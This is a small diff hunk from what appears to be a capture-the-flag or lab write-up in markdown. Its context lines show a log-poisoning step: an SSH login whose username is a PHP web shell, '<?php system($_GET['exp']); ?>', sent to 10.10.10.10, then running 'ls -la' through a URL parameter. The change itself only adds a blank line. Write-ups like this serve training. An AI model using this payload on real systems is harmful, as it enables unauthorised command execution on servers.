@@ -81,6 +81,7 @@ ssh '<?php system($_GET['exp']); ?>'@10.10.10.10
 <br />
 
 Now, add `&exp=ls -la` to the URL.
+
 ![](Pics/web6.png)
 <br />
 <br />
